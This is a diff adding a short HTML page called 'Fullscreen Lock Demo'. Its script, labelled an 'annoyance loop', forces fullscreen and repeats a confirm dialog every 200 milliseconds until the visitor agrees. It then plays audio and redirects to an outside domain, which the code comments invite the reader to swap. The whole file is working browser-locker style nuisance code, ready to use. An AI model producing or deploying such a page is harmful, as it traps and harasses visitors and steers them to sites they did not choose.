@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Fullscreen Lock Demo</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+      font-size: 3em;
+      font-family: Arial, sans-serif;
+      text-transform: uppercase;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div>CAN YOU HEAR THE MUSIC</div>
+
+  <audio id="bg-music" loop>
+    <!-- Replace this with any mp3 you want -->
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    // Go fullscreen on first click
+    function goFull() {
+      document.documentElement.requestFullscreen().catch(()=>{});
+    }
+    document.body.addEventListener("click", goFull);
+
+    // Annoyance loop
+    function annoyanceLoop() {
+      let proceed = confirm("CAN YOU HEAR THE MUSIC?");
+      if (proceed) {
+        // Play music
+        let audio = document.getElementById("bg-music");
+        audio.play().catch(()=>{});
+
+        // Redirect to a link
+        window.location.href = "https://GEARMUN.in"; // <-- change this link
+      } else {
+        // Keep asking until user says OK
+        setTimeout(annoyanceLoop, 200);
+      }
+    }
+
+    // Start loop after short delay
+    setTimeout(annoyanceLoop, 1000);
+  </script>
+</body>
+</html>
